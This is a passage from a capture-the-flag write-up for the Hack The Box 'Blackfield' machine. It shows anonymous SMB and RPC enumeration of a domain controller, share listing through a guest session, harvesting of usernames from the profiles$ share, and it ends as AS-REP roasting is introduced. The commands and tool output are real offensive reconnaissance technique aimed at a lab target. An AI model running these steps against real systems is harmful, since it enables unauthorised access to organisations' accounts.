</span><span id="__span-7-48"><a id="__codelineno-7-48" name="__codelineno-7-48" href="#__codelineno-7-48"></a>SMB1<span class="w"> </span>only:<span class="w"> </span><span class="nb">false</span>
</span><span id="__span-7-49"><a id="__codelineno-7-49" name="__codelineno-7-49" href="#__codelineno-7-49"></a>SMB<span class="w"> </span>signing<span class="w"> </span>required:<span class="w"> </span><span class="nb">true</span>
</span><span id="__span-7-50"><a id="__codelineno-7-50" name="__codelineno-7-50" href="#__codelineno-7-50"></a>
</span><span id="__span-7-51"><a id="__codelineno-7-51" name="__codelineno-7-51" href="#__codelineno-7-51"></a><span class="w"> </span><span class="o">=============================================================</span>
</span><span id="__span-7-52"><a id="__codelineno-7-52" name="__codelineno-7-52" href="#__codelineno-7-52"></a><span class="p">|</span><span class="w">    </span>Domain<span class="w"> </span>Information<span class="w"> </span>via<span class="w"> </span>SMB<span class="w"> </span>session<span class="w"> </span><span class="k">for</span><span class="w"> </span>blackfield.htb<span class="w">    </span><span class="p">|</span>
</span><span id="__span-7-53"><a id="__codelineno-7-53" name="__codelineno-7-53" href="#__codelineno-7-53"></a><span class="w"> </span><span class="o">=============================================================</span>
</span><span id="__span-7-54"><a id="__codelineno-7-54" name="__codelineno-7-54" href="#__codelineno-7-54"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Enumerating<span class="w"> </span>via<span class="w"> </span>unauthenticated<span class="w"> </span>SMB<span class="w"> </span>session<span class="w"> </span>on<span class="w"> </span><span class="m">445</span>/tcp
</span><span id="__span-7-55"><a id="__codelineno-7-55" name="__codelineno-7-55" href="#__codelineno-7-55"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Found<span class="w"> </span>domain<span class="w"> </span>information<span class="w"> </span>via<span class="w"> </span>SMB
</span><span id="__span-7-56"><a id="__codelineno-7-56" name="__codelineno-7-56" href="#__codelineno-7-56"></a>NetBIOS<span class="w"> </span>computer<span class="w"> </span>name:<span class="w"> </span>DC01
</span><span id="__span-7-57"><a id="__codelineno-7-57" name="__codelineno-7-57" href="#__codelineno-7-57"></a>NetBIOS<span class="w"> </span>domain<span class="w"> </span>name:<span class="w"> </span>BLACKFIELD
</span><span id="__span-7-58"><a id="__codelineno-7-58" name="__codelineno-7-58" href="#__codelineno-7-58"></a>DNS<span class="w"> </span>domain:<span class="w"> </span>BLACKFIELD.local
</span><span id="__span-7-59"><a id="__codelineno-7-59" name="__codelineno-7-59" href="#__codelineno-7-59"></a>FQDN:<span class="w"> </span>DC01.BLACKFIELD.local
</span><span id="__span-7-60"><a id="__codelineno-7-60" name="__codelineno-7-60" href="#__codelineno-7-60"></a>Derived<span class="w"> </span>membership:<span class="w"> </span>domain<span class="w"> </span>member
</span><span id="__span-7-61"><a id="__codelineno-7-61" name="__codelineno-7-61" href="#__codelineno-7-61"></a>Derived<span class="w"> </span>domain:<span class="w"> </span><span class="nv">BLACKFIELD</span>
</span><span id="__span-7-62"><a id="__codelineno-7-62" name="__codelineno-7-62" href="#__codelineno-7-62"></a>
</span><span id="__span-7-63"><a id="__codelineno-7-63" name="__codelineno-7-63" href="#__codelineno-7-63"></a><span class="w"> </span><span class="o">===========================================</span>
</span><span id="__span-7-64"><a id="__codelineno-7-64" name="__codelineno-7-64" href="#__codelineno-7-64"></a><span class="p">|</span><span class="w">    </span>RPC<span class="w"> </span>Session<span class="w"> </span>Check<span class="w"> </span>on<span class="w"> </span>blackfield.htb<span class="w">    </span><span class="p">|</span>
</span><span id="__span-7-65"><a id="__codelineno-7-65" name="__codelineno-7-65" href="#__codelineno-7-65"></a><span class="w"> </span><span class="o">===========================================</span>
</span><span id="__span-7-66"><a id="__codelineno-7-66" name="__codelineno-7-66" href="#__codelineno-7-66"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Check<span class="w"> </span><span class="k">for</span><span class="w"> </span>null<span class="w"> </span>session
</span><span id="__span-7-67"><a id="__codelineno-7-67" name="__codelineno-7-67" href="#__codelineno-7-67"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Server<span class="w"> </span>allows<span class="w"> </span>session<span class="w"> </span>using<span class="w"> </span>username<span class="w"> </span><span class="s1">&#39;&#39;</span>,<span class="w"> </span>password<span class="w"> </span><span class="s1">&#39;&#39;</span>
</span><span id="__span-7-68"><a id="__codelineno-7-68" name="__codelineno-7-68" href="#__codelineno-7-68"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Check<span class="w"> </span><span class="k">for</span><span class="w"> </span>random<span class="w"> </span>user
</span><span id="__span-7-69"><a id="__codelineno-7-69" name="__codelineno-7-69" href="#__codelineno-7-69"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Server<span class="w"> </span>allows<span class="w"> </span>session<span class="w"> </span>using<span class="w"> </span>username<span class="w"> </span><span class="s1">&#39;glltacrg&#39;</span>,<span class="w"> </span>password<span class="w"> </span><span class="s1">&#39;&#39;</span>
</span><span id="__span-7-70"><a id="__codelineno-7-70" name="__codelineno-7-70" href="#__codelineno-7-70"></a><span class="o">[</span>H<span class="o">]</span><span class="w"> </span>Rerunning<span class="w"> </span>enumeration<span class="w"> </span>with<span class="w"> </span>user<span class="w"> </span><span class="s1">&#39;glltacrg&#39;</span><span class="w"> </span>might<span class="w"> </span>give<span class="w"> </span>more<span class="w"> </span><span class="nv">results</span>
</span><span id="__span-7-71"><a id="__codelineno-7-71" name="__codelineno-7-71" href="#__codelineno-7-71"></a>
</span><span id="__span-7-72"><a id="__codelineno-7-72" name="__codelineno-7-72" href="#__codelineno-7-72"></a><span class="w"> </span><span class="o">=====================================================</span>
</span><span id="__span-7-73"><a id="__codelineno-7-73" name="__codelineno-7-73" href="#__codelineno-7-73"></a><span class="p">|</span><span class="w">    </span>Domain<span class="w"> </span>Information<span class="w"> </span>via<span class="w"> </span>RPC<span class="w"> </span><span class="k">for</span><span class="w"> </span>blackfield.htb<span class="w">    </span><span class="p">|</span>
</span><span id="__span-7-74"><a id="__codelineno-7-74" name="__codelineno-7-74" href="#__codelineno-7-74"></a><span class="w"> </span><span class="o">=====================================================</span>
</span><span id="__span-7-75"><a id="__codelineno-7-75" name="__codelineno-7-75" href="#__codelineno-7-75"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Domain:<span class="w"> </span>BLACKFIELD
</span><span id="__span-7-76"><a id="__codelineno-7-76" name="__codelineno-7-76" href="#__codelineno-7-76"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Domain<span class="w"> </span>SID:<span class="w"> </span>S-1-5-21-4194615774-2175524697-3563712290
</span><span id="__span-7-77"><a id="__codelineno-7-77" name="__codelineno-7-77" href="#__codelineno-7-77"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Membership:<span class="w"> </span>domain<span class="w"> </span><span class="nv">member</span>
</span><span id="__span-7-78"><a id="__codelineno-7-78" name="__codelineno-7-78" href="#__codelineno-7-78"></a>
</span><span id="__span-7-79"><a id="__codelineno-7-79" name="__codelineno-7-79" href="#__codelineno-7-79"></a><span class="w"> </span><span class="o">=================================================</span>
</span><span id="__span-7-80"><a id="__codelineno-7-80" name="__codelineno-7-80" href="#__codelineno-7-80"></a><span class="p">|</span><span class="w">    </span>OS<span class="w"> </span>Information<span class="w"> </span>via<span class="w"> </span>RPC<span class="w"> </span><span class="k">for</span><span class="w"> </span>blackfield.htb<span class="w">    </span><span class="p">|</span>
</span><span id="__span-7-81"><a id="__codelineno-7-81" name="__codelineno-7-81" href="#__codelineno-7-81"></a><span class="w"> </span><span class="o">=================================================</span>
</span><span id="__span-7-82"><a id="__codelineno-7-82" name="__codelineno-7-82" href="#__codelineno-7-82"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Enumerating<span class="w"> </span>via<span class="w"> </span>unauthenticated<span class="w"> </span>SMB<span class="w"> </span>session<span class="w"> </span>on<span class="w"> </span><span class="m">445</span>/tcp
</span><span id="__span-7-83"><a id="__codelineno-7-83" name="__codelineno-7-83" href="#__codelineno-7-83"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Found<span class="w"> </span>OS<span class="w"> </span>information<span class="w"> </span>via<span class="w"> </span>SMB
</span><span id="__span-7-84"><a id="__codelineno-7-84" name="__codelineno-7-84" href="#__codelineno-7-84"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Enumerating<span class="w"> </span>via<span class="w"> </span><span class="s1">&#39;srvinfo&#39;</span>
</span><span id="__span-7-85"><a id="__codelineno-7-85" name="__codelineno-7-85" href="#__codelineno-7-85"></a><span class="o">[</span>-<span class="o">]</span><span class="w"> </span>Could<span class="w"> </span>not<span class="w"> </span>get<span class="w"> </span>OS<span class="w"> </span>info<span class="w"> </span>via<span class="w"> </span><span class="s1">&#39;srvinfo&#39;</span>:<span class="w"> </span>STATUS_ACCESS_DENIED
</span><span id="__span-7-86"><a id="__codelineno-7-86" name="__codelineno-7-86" href="#__codelineno-7-86"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>After<span class="w"> </span>merging<span class="w"> </span>OS<span class="w"> </span>information<span class="w"> </span>we<span class="w"> </span>have<span class="w"> </span>the<span class="w"> </span>following<span class="w"> </span>result:
</span><span id="__span-7-87"><a id="__codelineno-7-87" name="__codelineno-7-87" href="#__codelineno-7-87"></a>OS:<span class="w"> </span>Windows<span class="w"> </span><span class="m">10</span>,<span class="w"> </span>Windows<span class="w"> </span>Server<span class="w"> </span><span class="m">2019</span>,<span class="w"> </span>Windows<span class="w"> </span>Server<span class="w"> </span><span class="m">2016</span>
</span><span id="__span-7-88"><a id="__codelineno-7-88" name="__codelineno-7-88" href="#__codelineno-7-88"></a>OS<span class="w"> </span>version:<span class="w"> </span><span class="s1">&#39;10.0&#39;</span>
</span><span id="__span-7-89"><a id="__codelineno-7-89" name="__codelineno-7-89" href="#__codelineno-7-89"></a>OS<span class="w"> </span>release:<span class="w"> </span><span class="s1">&#39;1809&#39;</span>
</span><span id="__span-7-90"><a id="__codelineno-7-90" name="__codelineno-7-90" href="#__codelineno-7-90"></a>OS<span class="w"> </span>build:<span class="w"> </span><span class="s1">&#39;17763&#39;</span>
</span><span id="__span-7-91"><a id="__codelineno-7-91" name="__codelineno-7-91" href="#__codelineno-7-91"></a>Native<span class="w"> </span>OS:<span class="w"> </span>not<span class="w"> </span>supported
</span><span id="__span-7-92"><a id="__codelineno-7-92" name="__codelineno-7-92" href="#__codelineno-7-92"></a>Native<span class="w"> </span>LAN<span class="w"> </span>manager:<span class="w"> </span>not<span class="w"> </span>supported
</span><span id="__span-7-93"><a id="__codelineno-7-93" name="__codelineno-7-93" href="#__codelineno-7-93"></a>Platform<span class="w"> </span>id:<span class="w"> </span>null
</span><span id="__span-7-94"><a id="__codelineno-7-94" name="__codelineno-7-94" href="#__codelineno-7-94"></a>Server<span class="w"> </span>type:<span class="w"> </span>null
</span><span id="__span-7-95"><a id="__codelineno-7-95" name="__codelineno-7-95" href="#__codelineno-7-95"></a>Server<span class="w"> </span><span class="nb">type</span><span class="w"> </span>string:<span class="w"> </span><span class="nv">null</span>
</span><span id="__span-7-96"><a id="__codelineno-7-96" name="__codelineno-7-96" href="#__codelineno-7-96"></a>
</span><span id="__span-7-97"><a id="__codelineno-7-97" name="__codelineno-7-97" href="#__codelineno-7-97"></a><span class="w"> </span><span class="o">=======================================</span>
</span><span id="__span-7-98"><a id="__codelineno-7-98" name="__codelineno-7-98" href="#__codelineno-7-98"></a><span class="p">|</span><span class="w">    </span>Users<span class="w"> </span>via<span class="w"> </span>RPC<span class="w"> </span>on<span class="w"> </span>blackfield.htb<span class="w">    </span><span class="p">|</span>
</span><span id="__span-7-99"><a id="__codelineno-7-99" name="__codelineno-7-99" href="#__codelineno-7-99"></a><span class="w"> </span><span class="o">=======================================</span>
</span><span id="__span-7-100"><a id="__codelineno-7-100" name="__codelineno-7-100" href="#__codelineno-7-100"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Enumerating<span class="w"> </span>users<span class="w"> </span>via<span class="w"> </span><span class="s1">&#39;querydispinfo&#39;</span>
</span><span id="__span-7-101"><a id="__codelineno-7-101" name="__codelineno-7-101" href="#__codelineno-7-101"></a><span class="o">[</span>-<span class="o">]</span><span class="w"> </span>Could<span class="w"> </span>not<span class="w"> </span>find<span class="w"> </span>users<span class="w"> </span>via<span class="w"> </span><span class="s1">&#39;querydispinfo&#39;</span>:<span class="w"> </span>STATUS_ACCESS_DENIED
</span><span id="__span-7-102"><a id="__codelineno-7-102" name="__codelineno-7-102" href="#__codelineno-7-102"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Enumerating<span class="w"> </span>users<span class="w"> </span>via<span class="w"> </span><span class="s1">&#39;enumdomusers&#39;</span>
</span><span id="__span-7-103"><a id="__codelineno-7-103" name="__codelineno-7-103" href="#__codelineno-7-103"></a><span class="o">[</span>-<span class="o">]</span><span class="w"> </span>Could<span class="w"> </span>not<span class="w"> </span>find<span class="w"> </span>users<span class="w"> </span>via<span class="w"> </span><span class="s1">&#39;enumdomusers&#39;</span>:<span class="w"> </span><span class="nv">STATUS_ACCESS_DENIED</span>
</span><span id="__span-7-104"><a id="__codelineno-7-104" name="__codelineno-7-104" href="#__codelineno-7-104"></a>
</span><span id="__span-7-105"><a id="__codelineno-7-105" name="__codelineno-7-105" href="#__codelineno-7-105"></a><span class="w"> </span><span class="o">========================================</span>
</span><span id="__span-7-106"><a id="__codelineno-7-106" name="__codelineno-7-106" href="#__codelineno-7-106"></a><span class="p">|</span><span class="w">    </span>Groups<span class="w"> </span>via<span class="w"> </span>RPC<span class="w"> </span>on<span class="w"> </span>blackfield.htb<span class="w">    </span><span class="p">|</span>
</span><span id="__span-7-107"><a id="__codelineno-7-107" name="__codelineno-7-107" href="#__codelineno-7-107"></a><span class="w"> </span><span class="o">========================================</span>
</span><span id="__span-7-108"><a id="__codelineno-7-108" name="__codelineno-7-108" href="#__codelineno-7-108"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Enumerating<span class="w"> </span><span class="nb">local</span><span class="w"> </span>groups
</span><span id="__span-7-109"><a id="__codelineno-7-109" name="__codelineno-7-109" href="#__codelineno-7-109"></a><span class="o">[</span>-<span class="o">]</span><span class="w"> </span>Could<span class="w"> </span>not<span class="w"> </span>get<span class="w"> </span>groups<span class="w"> </span>via<span class="w"> </span><span class="s1">&#39;enumalsgroups domain&#39;</span>:<span class="w"> </span>STATUS_ACCESS_DENIED
</span><span id="__span-7-110"><a id="__codelineno-7-110" name="__codelineno-7-110" href="#__codelineno-7-110"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Enumerating<span class="w"> </span><span class="nb">builtin</span><span class="w"> </span>groups
</span><span id="__span-7-111"><a id="__codelineno-7-111" name="__codelineno-7-111" href="#__codelineno-7-111"></a><span class="o">[</span>-<span class="o">]</span><span class="w"> </span>Could<span class="w"> </span>not<span class="w"> </span>get<span class="w"> </span>groups<span class="w"> </span>via<span class="w"> </span><span class="s1">&#39;enumalsgroups builtin&#39;</span>:<span class="w"> </span>STATUS_ACCESS_DENIED
</span><span id="__span-7-112"><a id="__codelineno-7-112" name="__codelineno-7-112" href="#__codelineno-7-112"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Enumerating<span class="w"> </span>domain<span class="w"> </span>groups
</span><span id="__span-7-113"><a id="__codelineno-7-113" name="__codelineno-7-113" href="#__codelineno-7-113"></a><span class="o">[</span>-<span class="o">]</span><span class="w"> </span>Could<span class="w"> </span>not<span class="w"> </span>get<span class="w"> </span>groups<span class="w"> </span>via<span class="w"> </span><span class="s1">&#39;enumdomgroups&#39;</span>:<span class="w"> </span><span class="nv">STATUS_ACCESS_DENIED</span>
</span><span id="__span-7-114"><a id="__codelineno-7-114" name="__codelineno-7-114" href="#__codelineno-7-114"></a>
</span><span id="__span-7-115"><a id="__codelineno-7-115" name="__codelineno-7-115" href="#__codelineno-7-115"></a><span class="w"> </span><span class="o">========================================</span>
</span><span id="__span-7-116"><a id="__codelineno-7-116" name="__codelineno-7-116" href="#__codelineno-7-116"></a><span class="p">|</span><span class="w">    </span>Shares<span class="w"> </span>via<span class="w"> </span>RPC<span class="w"> </span>on<span class="w"> </span>blackfield.htb<span class="w">    </span><span class="p">|</span>
</span><span id="__span-7-117"><a id="__codelineno-7-117" name="__codelineno-7-117" href="#__codelineno-7-117"></a><span class="w"> </span><span class="o">========================================</span>
</span><span id="__span-7-118"><a id="__codelineno-7-118" name="__codelineno-7-118" href="#__codelineno-7-118"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Enumerating<span class="w"> </span>shares
</span><span id="__span-7-119"><a id="__codelineno-7-119" name="__codelineno-7-119" href="#__codelineno-7-119"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Found<span class="w"> </span><span class="m">0</span><span class="w"> </span>share<span class="o">(</span>s<span class="o">)</span><span class="w"> </span><span class="k">for</span><span class="w"> </span>user<span class="w"> </span><span class="s1">&#39;&#39;</span><span class="w"> </span>with<span class="w"> </span>password<span class="w"> </span><span class="s1">&#39;&#39;</span>,<span class="w"> </span>try<span class="w"> </span>a<span class="w"> </span>different<span class="w"> </span><span class="nv">user</span>
</span><span id="__span-7-120"><a id="__codelineno-7-120" name="__codelineno-7-120" href="#__codelineno-7-120"></a>
</span><span id="__span-7-121"><a id="__codelineno-7-121" name="__codelineno-7-121" href="#__codelineno-7-121"></a><span class="w"> </span><span class="o">===========================================</span>
</span><span id="__span-7-122"><a id="__codelineno-7-122" name="__codelineno-7-122" href="#__codelineno-7-122"></a><span class="p">|</span><span class="w">    </span>Policies<span class="w"> </span>via<span class="w"> </span>RPC<span class="w"> </span><span class="k">for</span><span class="w"> </span>blackfield.htb<span class="w">    </span><span class="p">|</span>
</span><span id="__span-7-123"><a id="__codelineno-7-123" name="__codelineno-7-123" href="#__codelineno-7-123"></a><span class="w"> </span><span class="o">===========================================</span>
</span><span id="__span-7-124"><a id="__codelineno-7-124" name="__codelineno-7-124" href="#__codelineno-7-124"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Trying<span class="w"> </span>port<span class="w"> </span><span class="m">445</span>/tcp
</span><span id="__span-7-125"><a id="__codelineno-7-125" name="__codelineno-7-125" href="#__codelineno-7-125"></a><span class="o">[</span>-<span class="o">]</span><span class="w"> </span>SMB<span class="w"> </span>connection<span class="w"> </span>error<span class="w"> </span>on<span class="w"> </span>port<span class="w"> </span><span class="m">445</span>/tcp:<span class="w"> </span><span class="nv">STATUS_ACCESS_DENIED</span>
</span><span id="__span-7-126"><a id="__codelineno-7-126" name="__codelineno-7-126" href="#__codelineno-7-126"></a>
</span><span id="__span-7-127"><a id="__codelineno-7-127" name="__codelineno-7-127" href="#__codelineno-7-127"></a><span class="w"> </span><span class="o">===========================================</span>
</span><span id="__span-7-128"><a id="__codelineno-7-128" name="__codelineno-7-128" href="#__codelineno-7-128"></a><span class="p">|</span><span class="w">    </span>Printers<span class="w"> </span>via<span class="w"> </span>RPC<span class="w"> </span><span class="k">for</span><span class="w"> </span>blackfield.htb<span class="w">    </span><span class="p">|</span>
</span><span id="__span-7-129"><a id="__codelineno-7-129" name="__codelineno-7-129" href="#__codelineno-7-129"></a><span class="w"> </span><span class="o">===========================================</span>
</span><span id="__span-7-130"><a id="__codelineno-7-130" name="__codelineno-7-130" href="#__codelineno-7-130"></a><span class="o">[</span>-<span class="o">]</span><span class="w"> </span>Could<span class="w"> </span>not<span class="w"> </span>get<span class="w"> </span>printer<span class="w"> </span>info<span class="w"> </span>via<span class="w"> </span><span class="s1">&#39;enumprinters&#39;</span>:<span class="w"> </span>STATUS_ACCESS_DENIED
</span></code></pre></div><br />
Nothing too interesting here</p>
<h2 id="smb-enumeration-as-anonymous">SMB enumeration as anonymous</h2>
<p><strong>SMB anonymous logon</strong><br />
<div class="language-bash highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>nxc<span class="w"> </span>smb<span class="w"> </span>blackfield.htb<span class="w">  </span>-u<span class="w"> </span><span class="s1">&#39;&#39;</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;&#39;</span><span class="w"> </span>--shares
</span></code></pre></div></p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>SMB<span class="w">         </span><span class="m">10</span>.129.164.18<span class="w">   </span><span class="m">445</span><span class="w">    </span>DC01<span class="w">             </span><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Windows<span class="w"> </span><span class="m">10</span><span class="w"> </span>/<span class="w"> </span>Server<span class="w"> </span><span class="m">2019</span><span class="w"> </span>Build<span class="w"> </span><span class="m">17763</span><span class="w"> </span>x64<span class="w"> </span><span class="o">(</span>name:DC01<span class="o">)</span><span class="w"> </span><span class="o">(</span>domain:BLACKFIELD.local<span class="o">)</span><span class="w"> </span><span class="o">(</span>signing:True<span class="o">)</span><span class="w"> </span><span class="o">(</span>SMBv1:False<span class="o">)</span>
</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a>SMB<span class="w">         </span><span class="m">10</span>.129.164.18<span class="w">   </span><span class="m">445</span><span class="w">    </span>DC01<span class="w">             </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>BLACKFIELD.local<span class="se">\\</span>:<span class="w"> </span>
</span><span id="__span-9-3"><a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a>SMB<span class="w">         </span><span class="m">10</span>.129.164.18<span class="w">   </span><span class="m">445</span><span class="w">    </span>DC01<span class="w">             </span><span class="o">[</span>-<span class="o">]</span><span class="w"> </span>Error<span class="w"> </span>enumerating<span class="w"> </span>shares:<span class="w"> </span>STATUS_ACCESS_DENIED
</span></code></pre></div>
<p>does not appear successful, BUT lets try smbmap too:<br />
<div class="language-bash highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>smbmap<span class="w"> </span>-H<span class="w"> </span>blackfield.htb<span class="w"> </span>-u<span class="w"> </span>null
</span></code></pre></div></p>
<p><div class="language-bash highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Guest<span class="w"> </span>session<span class="w">       </span>IP:<span class="w"> </span>blackfield.htb:445<span class="w">  </span>Name:<span class="w"> </span>unknown<span class="w">                                           </span>
</span><span id="__span-11-2"><a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a>Disk<span class="w">                                                </span>Permissions<span class="w"> </span>Comment
</span><span id="__span-11-3"><a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a>----<span class="w">                                                </span>-----------<span class="w"> </span>-------
</span><span id="__span-11-4"><a id="__codelineno-11-4" name="__codelineno-11-4" href="#__codelineno-11-4"></a>ADMIN$<span class="w">                                              </span>NO<span class="w"> </span>ACCESS<span class="w">   </span>Remote<span class="w"> </span>Admin
</span><span id="__span-11-5"><a id="__codelineno-11-5" name="__codelineno-11-5" href="#__codelineno-11-5"></a>C$<span class="w">                                                  </span>NO<span class="w"> </span>ACCESS<span class="w">   </span>Default<span class="w"> </span>share
</span><span id="__span-11-6"><a id="__codelineno-11-6" name="__codelineno-11-6" href="#__codelineno-11-6"></a>forensic<span class="w">                                            </span>NO<span class="w"> </span>ACCESS<span class="w">   </span>Forensic<span class="w"> </span>/<span class="w"> </span>Audit<span class="w"> </span>share.
</span><span id="__span-11-7"><a id="__codelineno-11-7" name="__codelineno-11-7" href="#__codelineno-11-7"></a>IPC$<span class="w">                                                </span>READ<span class="w"> </span>ONLY<span class="w">   </span>Remote<span class="w"> </span>IPC
</span><span id="__span-11-8"><a id="__codelineno-11-8" name="__codelineno-11-8" href="#__codelineno-11-8"></a>NETLOGON<span class="w">                                            </span>NO<span class="w"> </span>ACCESS<span class="w">   </span>Logon<span class="w"> </span>server<span class="w"> </span>share<span class="w"> </span>
</span><span id="__span-11-9"><a id="__codelineno-11-9" name="__codelineno-11-9" href="#__codelineno-11-9"></a>profiles$<span class="w">                                           </span>READ<span class="w"> </span>ONLY<span class="w">   </span>
</span><span id="__span-11-10"><a id="__codelineno-11-10" name="__codelineno-11-10" href="#__codelineno-11-10"></a>SYSVOL<span class="w">                                              </span>NO<span class="w"> </span>ACCESS<span class="w">   </span>Logon<span class="w"> </span>server<span class="w"> </span>share<span class="w"> </span>
</span></code></pre></div><br />
interesting! it appears that we can view shares via guest session!</p>
<p>Lets try inspecting the shares, the share <code>forensic</code> appears to not be a default one, but dont have permissions to view it. So we should focus to the shares that we have <code>READ ONLY</code> permissions such as the <code>IPC$</code> and <code>profiles$</code><br />
<div class="language-bash highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>smbclient<span class="w"> </span>-N<span class="w"> </span>//blackfield.htb/IPC$
</span></code></pre></div><br />
got NT_STATUS_NO_SUCH_FILE listing * , we cant access that share.  </p>
<p>I then inspected the <code>profiles$</code> share:<br />
<div class="language-bash highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>smbclient<span class="w"> </span>-N<span class="w"> </span>//blackfield.htb/profiles$
</span></code></pre></div></p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>mb:<span class="w"> </span><span class="se">\\</span>&gt;<span class="w"> </span>ls
</span><span id="__span-14-2"><a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a><span class="w">  </span>.<span class="w">                                   </span>D<span class="w">        </span><span class="m">0</span><span class="w">  </span>Wed<span class="w"> </span>Jun<span class="w">  </span><span class="m">3</span><span class="w"> </span><span class="m">11</span>:47:12<span class="w"> </span><span class="m">2020</span>
</span><span id="__span-14-3"><a id="__codelineno-14-3" name="__codelineno-14-3" href="#__codelineno-14-3"></a><span class="w">  </span>..<span class="w">                                  </span>D<span class="w">        </span><span class="m">0</span><span class="w">  </span>Wed<span class="w"> </span>Jun<span class="w">  </span><span class="m">3</span><span class="w"> </span><span class="m">11</span>:47:12<span class="w"> </span><span class="m">2020</span>
</span><span id="__span-14-4"><a id="__codelineno-14-4" name="__codelineno-14-4" href="#__codelineno-14-4"></a><span class="w">  </span>AAlleni<span class="w">                             </span>D<span class="w">        </span><span class="m">0</span><span class="w">  </span>Wed<span class="w"> </span>Jun<span class="w">  </span><span class="m">3</span><span class="w"> </span><span class="m">11</span>:47:11<span class="w"> </span><span class="m">2020</span>
</span><span id="__span-14-5"><a id="__codelineno-14-5" name="__codelineno-14-5" href="#__codelineno-14-5"></a><span class="w">  </span>ABarteski<span class="w">                           </span>D<span class="w">        </span><span class="m">0</span><span class="w">  </span>Wed<span class="w"> </span>Jun<span class="w">  </span><span class="m">3</span><span class="w"> </span><span class="m">11</span>:47:11<span class="w"> </span><span class="m">2020</span>
</span><span id="__span-14-6"><a id="__codelineno-14-6" name="__codelineno-14-6" href="#__codelineno-14-6"></a><span class="w">  </span>ABekesz<span class="w">                             </span>D<span class="w">        </span><span class="m">0</span><span class="w">  </span>Wed<span class="w"> </span>Jun<span class="w">  </span><span class="m">3</span><span class="w"> </span><span class="m">11</span>:47:11<span class="w"> </span><span class="m">2020</span>
</span><span id="__span-14-7"><a id="__codelineno-14-7" name="__codelineno-14-7" href="#__codelineno-14-7"></a><span class="w">  </span>ABenzies<span class="w">                            </span>D<span class="w">        </span><span class="m">0</span><span class="w">  </span>Wed<span class="w"> </span>Jun<span class="w">  </span><span class="m">3</span><span class="w"> </span><span class="m">11</span>:47:11<span class="w"> </span><span class="m">2020</span>
</span><span id="__span-14-8"><a id="__codelineno-14-8" name="__codelineno-14-8" href="#__codelineno-14-8"></a><span class="w">  </span>........
</span></code></pre></div>
<p>its contents appear to be usernames! also each one of them contains nothing, BUT this is a way to collect all users, so i copied all of them in a txt, and then sanitized the usernames so a new txt containing only them is formed:<br />
<div class="language-bash highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>awk<span class="w"> </span><span class="s1">&#39;{print $1}&#39;</span><span class="w"> </span>share_list.txt<span class="w"> </span>&gt;<span class="w"> </span>usernames.txt
</span></code></pre></div></p>
<p><div class="language-bash highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a>$<span class="w"> </span>cat<span class="w"> </span>usernames.txt<span class="w"> </span>
</span><span id="__span-16-2"><a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a>AAlleni
</span><span id="__span-16-3"><a id="__codelineno-16-3" name="__codelineno-16-3" href="#__codelineno-16-3"></a>ABarteski
</span><span id="__span-16-4"><a id="__codelineno-16-4" name="__codelineno-16-4" href="#__codelineno-16-4"></a>ABekesz
</span><span id="__span-16-5"><a id="__codelineno-16-5" name="__codelineno-16-5" href="#__codelineno-16-5"></a>ABenzies
</span><span id="__span-16-6"><a id="__codelineno-16-6" name="__codelineno-16-6" href="#__codelineno-16-6"></a>Foothold
</span></code></pre></div><br />
great! now that we have the usernames in a format that is usable, we can do a multitude of things.</p>
<p>For example we could try hunting for users that have the flag <code>DONT_REQ_PREAUTH</code> enabled, a method called <code>AS-REP</code> roasting.</p>
<h2 id="as-rep-roasting">AS-REP roasting</h2>
